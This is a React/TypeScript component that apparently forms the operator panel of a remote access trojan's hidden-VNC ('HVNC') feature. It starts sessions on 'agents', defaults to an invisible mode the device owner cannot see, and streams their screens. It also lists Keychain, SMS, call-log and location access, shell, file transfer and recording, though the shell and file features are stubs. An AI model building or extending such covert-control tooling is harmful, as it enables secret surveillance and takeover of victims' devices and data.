import React, { useState, useEffect, useRef } from 'react';
import { FiMonitor, FiMousePointer, FiType, FiClipboard, FiDownload, FiCamera, FiVideo, FiSettings, FiRefreshCw, FiMaximize, FiMinimize, FiSmartphone, FiWifi, FiHardDrive, FiTerminal, FiFolder } from 'react-icons/fi';
import { SiWindows, SiApple, SiAndroid, SiLinux } from 'react-icons/si';
import axios from 'axios';
import { useNotification } from '../contexts/NotificationContext';

interface HvncControlProps {
  agentId: string;
  platform: string;
  onClose: () => void;
}

interface PlatformCapabilities {
  hasDesktop: boolean;
  hasFileSystem: boolean;
  hasShell: boolean;
  hasScreenCapture: boolean;
  hasRemoteInput: boolean;
  hasProcessManagement: boolean;
  hasNetworkAccess: boolean;
  specialFeatures: string[];
}

const HvncControl: React.FC<HvncControlProps> = ({ agentId, platform, onClose }) => {
  const { addNotification } = useNotification();
  const [isConnected, setIsConnected] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [quality, setQuality] = useState('medium');
  const [fps, setFps] = useState('15');
  const [mode, setMode] = useState('hidden');
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [activeFeature, setActiveFeature] = useState<string>('desktop');
  const hvncScreenRef = useRef<HTMLDivElement>(null);

  // Platform-specific capabilities
  const getPlatformCapabilities = (platform: string): PlatformCapabilities => {
    switch (platform.toLowerCase()) {
      case 'windows':
        return {
          hasDesktop: true,
          hasFileSystem: true,
          hasShell: true,
          hasScreenCapture: true,
          hasRemoteInput: true,
          hasProcessManagement: true,
          hasNetworkAccess: true,
          specialFeatures: ['Registry Editor', 'Service Manager', 'Event Viewer', 'Task Manager']
        };
      case 'mac':
      case 'macos':
        return {
          hasDesktop: true,
          hasFileSystem: true,
          hasShell: true,
          hasScreenCapture: true,
          hasRemoteInput: true,
          hasProcessManagement: true,
          hasNetworkAccess: true,
          specialFeatures: ['Activity Monitor', 'System Preferences', 'Keychain Access', 'Console']
        };
      case 'android':
        return {
          hasDesktop: false,
          hasFileSystem: true,
          hasShell: true,
          hasScreenCapture: true,
          hasRemoteInput: true,
          hasProcessManagement: false,
          hasNetworkAccess: true,
          specialFeatures: ['App Manager', 'Device Info', 'SMS Access', 'Call Logs', 'Location Services']
        };
      case 'linux':
        return {
          hasDesktop: true,
          hasFileSystem: true,
          hasShell: true,
          hasScreenCapture: true,
          hasRemoteInput: true,
          hasProcessManagement: true,
          hasNetworkAccess: true,
          specialFeatures: ['System Monitor', 'Package Manager', 'Service Control', 'Log Viewer']
        };
      default:
        return {
          hasDesktop: false,
          hasFileSystem: true,
          hasShell: true,
          hasScreenCapture: false,
          hasRemoteInput: false,
          hasProcessManagement: false,
          hasNetworkAccess: true,
          specialFeatures: []
        };
    }
  };

  const capabilities = getPlatformCapabilities(platform);

  // Get platform icon
  const getPlatformIcon = (platform: string) => {
    switch (platform.toLowerCase()) {
      case 'windows':
        return <SiWindows className="w-5 h-5" />;
      case 'mac':
      case 'macos':
        return <SiApple className="w-5 h-5" />;
      case 'android':
        return <SiAndroid className="w-5 h-5" />;
      case 'linux':
        return <SiLinux className="w-5 h-5" />;
      default:
        return <FiMonitor className="w-5 h-5" />;
    }
  };

  const wsRef = useRef<WebSocket | null>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [connectionStatus, setConnectionStatus] = useState('Disconnected');

  // WebSocket connection for HVNC
  useEffect(() => {
    if (!wsRef.current) {
      const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
      const wsUrl = `${protocol}//${window.location.host}`;
      wsRef.current = new WebSocket(wsUrl);

      wsRef.current.onopen = () => {
        console.log('WebSocket connected for HVNC');
      };

      wsRef.current.onmessage = (event) => {
        try {
          const data = JSON.parse(event.data);
          
          if (data.type === 'hvnc_response' && data.agentId === agentId) {
            console.log('HVNC Response:', data);
            if (data.status === 'connected') {
              setIsConnected(true);
              setConnectionStatus('Connected');
            } else if (data.status === 'disconnected') {
              setIsConnected(false);
              setConnectionStatus('Disconnected');
            } else if (data.status === 'error') {
              setConnectionStatus(`Error: ${data.error}`);
            }
          }
          
          if (data.type === 'hvnc_frame' && data.agentId === agentId) {
            console.log('HVNC Frame received:', data.frameInfo);
            // Handle frame data for screen display
            if (data.frameData && canvasRef.current) {
              const canvas = canvasRef.current;
              const ctx = canvas.getContext('2d');
              
              // For SVG data (mock frames), create an image from SVG
              if (data.frameData.includes('<svg')) {
                const svgBlob = new Blob([atob(data.frameData)], { type: 'image/svg+xml' });
                const url = URL.createObjectURL(svgBlob);
                const img = new Image();
                
                img.onload = () => {
                  canvas.width = data.frameInfo?.width || img.width;
                  canvas.height = data.frameInfo?.height || img.height;
                  ctx.drawImage(img, 0, 0);
                  URL.revokeObjectURL(url);
                };
                
                img.src = url;
              } else {
                // For JPEG/PNG data
                const img = new Image();
                
                img.onload = () => {
                  canvas.width = data.frameInfo?.width || img.width;
                  canvas.height = data.frameInfo?.height || img.height;
                  ctx.drawImage(img, 0, 0);
                };
                
                img.src = `data:image/jpeg;base64,${data.frameData}`;
              }
            }
          }
        } catch (error) {
          console.error('Error parsing WebSocket message:', error);
        }
      };

      wsRef.current.onclose = () => {
        console.log('WebSocket disconnected');
        wsRef.current = null;
      };

      wsRef.current.onerror = (error) => {
        console.error('WebSocket error:', error);
      };
    }

    return () => {
      if (wsRef.current) {
        wsRef.current.close();
        wsRef.current = null;
      }
    };
  }, [agentId]);

  // Connect to HVNC session
  const connectHvnc = async () => {
    try {
      setIsLoading(true);
      setConnectionStatus('Connecting...');
      console.log('Attempting to connect HVNC for agent:', agentId);
      addNotification('info', `Connecting to remote session for agent ${agentId}...`);
      
      const response = await axios.post(`/api/agent/${agentId}/hvnc/start`, {
        quality,
        mode
      });
      
      console.log('HVNC start response:', response.data);
      
      if (response.data.status === 'success') {
        setSessionId(response.data.data.sessionId);
        setConnectionStatus('Starting session...');
        addNotification('success', `Successfully connected to remote session`);
      }
    } catch (error) {
      console.error('Failed to connect to HVNC session:', error);
      setConnectionStatus('Connection failed');
      addNotification('error', `Failed to connect to remote session: ${error.message || 'Unknown error'}`);
    } finally {
      setIsLoading(false);
    }
  };

  // Disconnect from HVNC session
  const disconnectHvnc = async () => {
    if (!sessionId) return;
    
    try {
      setConnectionStatus('Disconnecting...');
      addNotification('info', `Disconnecting from remote session...`);
      await axios.post(`/api/agent/${agentId}/hvnc/stop`, {
        sessionId
      });
      
      setIsConnected(false);
      setSessionId(null);
      setConnectionStatus('Disconnected');
      addNotification('success', `Successfully disconnected from remote session`);
    } catch (error) {
      console.error('Failed to disconnect from HVNC session:', error);
      setConnectionStatus('Disconnect failed');
      addNotification('error', `Failed to disconnect from remote session: ${error.message || 'Unknown error'}`);
    }
  };

  // Take screenshot
  const takeScreenshot = () => {
    if (!isConnected) return;
    
    // In a real implementation, this would capture the current screen
    console.log('Taking screenshot...');
  };

  // Toggle fullscreen
  const toggleFullscreen = () => {
    if (!hvncScreenRef.current) return;
    
    if (!isFullscreen) {
      if (hvncScreenRef.current.requestFullscreen) {
        hvncScreenRef.current.requestFullscreen();
      }
    } else {
      if (document.exitFullscreen) {
        document.exitFullscreen();
      }
    }
    
    setIsFullscreen(!isFullscreen);
  };

  // Clean up on unmount
  useEffect(() => {
    return () => {
      if (isConnected && sessionId) {
        disconnectHvnc();
      }
    };
  }, [isConnected, sessionId]);

  return (
    <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm p-6">
      <div className="flex justify-between items-center mb-4">
        <div className="flex items-center">
          {getPlatformIcon(platform)}
          <h3 className="text-xl font-semibold ml-2">
            {platform.charAt(0).toUpperCase() + platform.slice(1)} Remote Control
          </h3>
        </div>
        <div className="flex items-center">
          <span className={`inline-block w-3 h-3 rounded-full mr-2 ${isConnected ? 'bg-success' : 'bg-danger'}`}></span>
          <span>{isConnected ? 'Connected' : 'Disconnected'}</span>
        </div>
      </div>

      {/* Platform Capabilities Overview */}
      <div className="mb-4 p-3 bg-gray-50 dark:bg-boxdark-2 rounded-lg">
        <h4 className="text-sm font-medium mb-2">Platform Capabilities</h4>
        <div className="flex flex-wrap gap-2">
          {capabilities.hasDesktop && (
            <span className="px-2 py-1 bg-success/10 text-success text-xs rounded">Desktop Access</span>
          )}
          {capabilities.hasFileSystem && (
            <span className="px-2 py-1 bg-primary/10 text-primary text-xs rounded">File System</span>
          )}
          {capabilities.hasShell && (
            <span className="px-2 py-1 bg-warning/10 text-warning text-xs rounded">Shell Access</span>
          )}
          {capabilities.hasScreenCapture && (
            <span className="px-2 py-1 bg-info/10 text-info text-xs rounded">Screen Capture</span>
          )}
          {capabilities.hasRemoteInput && (
            <span className="px-2 py-1 bg-secondary/10 text-secondary text-xs rounded">Remote Input</span>
          )}
        </div>
      </div>

      {/* Feature Tabs */}
      <div className="mb-4">
        <div className="flex border-b border-stroke dark:border-strokedark">
          {capabilities.hasDesktop && (
            <button
              className={`px-4 py-2 text-sm font-medium border-b-2 transition-colors ${
                activeFeature === 'desktop'
                  ? 'border-primary text-primary'
                  : 'border-transparent text-bodydark2 hover:text-bodydark'
              }`}
              onClick={() => setActiveFeature('desktop')}
            >
              <FiMonitor className="w-4 h-4 inline mr-1" />
              Desktop
            </button>
          )}
          {capabilities.hasFileSystem && (
            <button
              className={`px-4 py-2 text-sm font-medium border-b-2 transition-colors ${
                activeFeature === 'files'
                  ? 'border-primary text-primary'
                  : 'border-transparent text-bodydark2 hover:text-bodydark'
              }`}
              onClick={() => setActiveFeature('files')}
            >
              <FiFolder className="w-4 h-4 inline mr-1" />
              Files
            </button>
          )}
          {capabilities.hasShell && (
            <button
              className={`px-4 py-2 text-sm font-medium border-b-2 transition-colors ${
                activeFeature === 'shell'
                  ? 'border-primary text-primary'
                  : 'border-transparent text-bodydark2 hover:text-bodydark'
              }`}
              onClick={() => setActiveFeature('shell')}
            >
              <FiTerminal className="w-4 h-4 inline mr-1" />
              Shell
            </button>
          )}
          {capabilities.specialFeatures.length > 0 && (
            <button
              className={`px-4 py-2 text-sm font-medium border-b-2 transition-colors ${
                activeFeature === 'special'
                  ? 'border-primary text-primary'
                  : 'border-transparent text-bodydark2 hover:text-bodydark'
              }`}
              onClick={() => setActiveFeature('special')}
            >
              <FiSettings className="w-4 h-4 inline mr-1" />
              Special
            </button>
          )}
        </div>
      </div>
      
      {isConnected ? (
        <div>
          {/* Desktop View */}
          {activeFeature === 'desktop' && capabilities.hasDesktop && (
            <div>
              <div 
                ref={hvncScreenRef}
                className="bg-boxdark rounded-lg p-2 mb-4"
              >
                <div className="aspect-video bg-black relative flex items-center justify-center">
                  <canvas 
                    ref={canvasRef}
                    className="max-w-full max-h-full border border-gray-600 rounded"
                    style={{ cursor: 'crosshair' }}
                  />
                  {!isConnected && (
                    <div className="absolute inset-0 flex items-center justify-center">
                      <div className="text-center">
                        {getPlatformIcon(platform)}
                        <p className="text-bodydark2 mt-2">
                          {platform === 'windows' && 'Windows Remote Desktop Session'}
                          {platform === 'mac' && 'macOS Remote Session'}
                          {platform === 'android' && 'Android Screen Mirror'}
                          {platform === 'linux' && 'Linux Desktop Session'}
                          {!['windows', 'mac', 'android', 'linux'].includes(platform.toLowerCase()) && 'Remote Session'}
                        </p>
                        <p className="text-xs text-bodydark2 mt-2">Status: {connectionStatus}</p>
                      </div>
                    </div>
                  )}
                </div>
              </div>
              
              {/* Desktop Controls */}
              <div className="flex flex-wrap gap-2 mb-4">
                {capabilities.hasRemoteInput && (
                  <>
                    <button className="py-2 px-3 bg-primary/10 text-primary rounded hover:bg-primary/20 transition-colors flex items-center">
                      <FiMousePointer className="w-4 h-4 mr-1" />
                      <span>Mouse</span>
                    </button>
                    <button className="py-2 px-3 bg-primary/10 text-primary rounded hover:bg-primary/20 transition-colors flex items-center">
                      <FiType className="w-4 h-4 mr-1" />
                      <span>Keyboard</span>
                    </button>
                  </>
                )}
                <button className="py-2 px-3 bg-primary/10 text-primary rounded hover:bg-primary/20 transition-colors flex items-center">
                  <FiClipboard className="w-4 h-4 mr-1" />
                  <span>Clipboard</span>
                </button>
                {capabilities.hasScreenCapture && (
                  <>
                    <button 
                      className="py-2 px-3 bg-warning/10 text-warning rounded hover:bg-warning/20 transition-colors flex items-center"
                      onClick={takeScreenshot}
                    >
                      <FiCamera className="w-4 h-4 mr-1" />
                      <span>Screenshot</span>
                    </button>
                    <button className="py-2 px-3 bg-success/10 text-success rounded hover:bg-success/20 transition-colors flex items-center">
                      <FiVideo className="w-4 h-4 mr-1" />
                      <span>Record</span>
                    </button>
                  </>
                )}
                <button 
                  className="py-2 px-3 bg-primary/10 text-primary rounded hover:bg-primary/20 transition-colors flex items-center"
                  onClick={toggleFullscreen}
                >
                  {isFullscreen ? (
                    <>
                      <FiMinimize className="w-4 h-4 mr-1" />
                      <span>Exit Fullscreen</span>
                    </>
                  ) : (
                    <>
                      <FiMaximize className="w-4 h-4 mr-1" />
                      <span>Fullscreen</span>
                    </>
                  )}
                </button>
              </div>
            </div>
          )}

          {/* File System View */}
          {activeFeature === 'files' && capabilities.hasFileSystem && (
            <div className="bg-gray-50 dark:bg-boxdark-2 rounded-lg p-4">
              <div className="flex items-center justify-between mb-4">
                <h4 className="font-medium">File System Browser</h4>
                <div className="flex gap-2">
                  <button className="py-1 px-3 bg-primary/10 text-primary rounded text-sm hover:bg-primary/20 transition-colors">
                    <FiDownload className="w-4 h-4 inline mr-1" />
                    Download
                  </button>
                  <button className="py-1 px-3 bg-success/10 text-success rounded text-sm hover:bg-success/20 transition-colors">
                    Upload
                  </button>
                </div>
              </div>
              <div className="text-center py-8 text-bodydark2">
                <FiFolder className="w-12 h-12 mx-auto mb-2" />
                <p>File system browser would be implemented here</p>
                <p className="text-xs mt-1">Platform: {platform}</p>
              </div>
            </div>
          )}

          {/* Shell View */}
          {activeFeature === 'shell' && capabilities.hasShell && (
            <div className="bg-black rounded-lg p-4">
              <div className="flex items-center justify-between mb-4">
                <h4 className="font-medium text-white">Shell Terminal</h4>
                <button className="py-1 px-3 bg-primary/10 text-primary rounded text-sm hover:bg-primary/20 transition-colors">
                  Clear
                </button>
              </div>
              <div className="bg-black text-green-400 font-mono text-sm p-4 rounded border min-h-[200px]">
                <div className="text-center py-8 text-gray-400">
                  <FiTerminal className="w-12 h-12 mx-auto mb-2" />
                  <p>Interactive shell terminal would be implemented here</p>
                  <p className="text-xs mt-1">Platform: {platform}</p>
                </div>
              </div>
            </div>
          )}

          {/* Special Features View */}
          {activeFeature === 'special' && capabilities.specialFeatures.length > 0 && (
            <div className="bg-gray-50 dark:bg-boxdark-2 rounded-lg p-4">
              <h4 className="font-medium mb-4">Platform-Specific Features</h4>
              <div className="grid grid-cols-2 gap-3">
                {capabilities.specialFeatures.map((feature, index) => (
                  <button
                    key={index}
                    className="p-3 bg-white dark:bg-boxdark rounded-lg border border-stroke dark:border-strokedark hover:bg-primary/5 transition-colors text-left"
                  >
                    <div className="flex items-center">
                      <FiSettings className="w-5 h-5 mr-2 text-primary" />
                      <span className="font-medium">{feature}</span>
                    </div>
                  </button>
                ))}
              </div>
            </div>
          )}

          {/* Connection Controls */}
          <div className="flex justify-between items-center mt-4 pt-4 border-t border-stroke dark:border-strokedark">
            <div className="flex items-center gap-4">
              <div className="flex items-center">
                <span className="text-sm text-bodydark2 mr-2">Quality:</span>
                <select 
                  className="bg-bodydark2/10 border border-stroke rounded p-1 text-sm"
                  value={quality}
                  onChange={(e) => setQuality(e.target.value)}
                >
                  <option value="high">High</option>
                  <option value="medium">Medium</option>
                  <option value="low">Low</option>
                </select>
              </div>
              {capabilities.hasDesktop && (
                <div className="flex items-center">
                  <span className="text-sm text-bodydark2 mr-2">FPS:</span>
                  <select 
                    className="bg-bodydark2/10 border border-stroke rounded p-1 text-sm"
                    value={fps}
                    onChange={(e) => setFps(e.target.value)}
                  >
                    <option value="30">30</option>
                    <option value="15">15</option>
                    <option value="5">5</option>
                  </select>
                </div>
              )}
              <button className="p-2 bg-primary/10 text-primary rounded hover:bg-primary/20 transition-colors">
                <FiRefreshCw className="w-4 h-4" />
              </button>
            </div>
            
            <button 
              className="py-2 px-4 bg-danger text-white rounded-lg hover:bg-danger/90 transition-colors"
              onClick={disconnectHvnc}
            >
              Disconnect
            </button>
          </div>
        </div>
      ) : (
        <div className="text-center py-8">
          <FiMonitor className="w-16 h-16 mx-auto mb-4 text-bodydark2" />
          <p className="mb-4">Start a remote HVNC session to control this agent</p>
          <div className="space-y-3 max-w-sm mx-auto">
            <div>
              <label className="block text-sm text-bodydark2 mb-1">Connection Mode</label>
              <select 
                className="w-full bg-bodydark2/10 border border-stroke rounded p-2"
                value={mode}
                onChange={(e) => setMode(e.target.value)}
              >
                <option value="hidden">Hidden Mode (Invisible)</option>
                <option value="visible">Visible Mode (User can see)</option>
                <option value="shared">Shared Mode (Collaborative)</option>
              </select>
            </div>
            <div>
              <label className="block text-sm text-bodydark2 mb-1">Quality Settings</label>
              <select 
                className="w-full bg-bodydark2/10 border border-stroke rounded p-2"
                value={quality}
                onChange={(e) => setQuality(e.target.value)}
              >
                <option value="high">High Quality (More Bandwidth)</option>
                <option value="medium">Medium Quality (Balanced)</option>
                <option value="low">Low Quality (Less Bandwidth)</option>
              </select>
            </div>
            <button 
              className="w-full py-2 px-4 bg-primary text-white rounded-lg"
              onClick={connectHvnc}
              disabled={isLoading}
            >
              {isLoading ? (
                <div className="flex items-center justify-center">
                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
                  Connecting...
                </div>
              ) : (
                'Connect'
              )}
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default HvncControl;